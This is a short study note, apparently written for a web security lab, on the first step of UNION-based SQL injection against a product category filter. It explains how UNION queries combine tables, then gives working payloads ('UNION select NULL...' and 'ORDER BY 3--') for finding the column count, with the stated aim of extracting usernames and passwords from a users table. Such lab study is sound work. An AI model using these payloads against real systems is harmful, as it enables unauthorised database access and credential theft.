SQLi - Product category filter

# STEP 1
Determind the number of columns return by the query

Backgroud For UNION
 table 1        table 2
 a | b          c | d
- - - -         - - - -
1 , 2            2 , 3
3 , 4            4 , 5

Query #1: 
select a, b from table1;
1,2
3,4

Query #2
select a, b from table1 UNION select c, d from table2
1,2
3,4
2,3
4,5

What we want to do is:
select a, b from table1
and add
UNION select username, password from users

Rules:
- The number and the order of the comumns must be the same in all queries
- The data types must be compatible

SQLi attack #1 UNION
'UNION select NULL, NULL, NULL--

select ? form table1 UNION select NULL
-> error == incorrect number of columns

select ? form table1 UNION select NULL, NULL, NULL
-> 200 == correct number of columns


SQLi attack #2 ORDER BY
'ORDER BY 3--


select ? from table1 ORDER BY 1--
-> 200 == is posible to order it by 1

BY 2 -> OK
BY 3 -> OK

select ? form table1 ORDER BY 4--
error == imposible to order it by 4

So 3 is the number of columns in the first table

Final PAYLOAD = 'UNION select NULL, NULL, NULL--
Final PAYLOAD = 'ORDER BY 3--
